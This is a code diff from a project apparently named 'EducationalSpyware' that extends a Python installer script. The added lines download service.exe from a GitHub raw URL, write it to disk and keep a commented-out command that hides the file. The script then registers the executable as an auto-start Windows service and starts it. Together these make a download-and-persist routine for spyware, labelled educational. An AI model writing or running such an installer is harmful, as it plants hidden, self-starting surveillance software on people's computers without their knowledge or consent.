@@ -15,8 +15,16 @@ def main():
     pymsgbox.alert('Correct password!', 'eduspyware')
 
     import os
+    import requests
+    url = 'https://github.com/eviatarbutin/EducationalSpyware/blob/main/service.exe?raw=true'
+    r = requests.get(url, allow_redirects=True)
+    open('service.exe', 'wb').write(r.content)
+    '''
+    import subprocess
+    subprocess.check_call(["attrib","+H","service.exe"])
+    '''
     srv_name = 'My Service'
-    os.system(fr'sc create "{srv_name}" start=auto binPath="C:\Users\user\Desktop\Python\EducationalSpyware\service.exe"')
+    os.system(fr'sc create "{srv_name}" start=auto binPath="C:\Users\user\Desktop\Python\EducationalSpyware\dist\service.exe"')
     os.system(f'sc start "{srv_name}"')
 
 
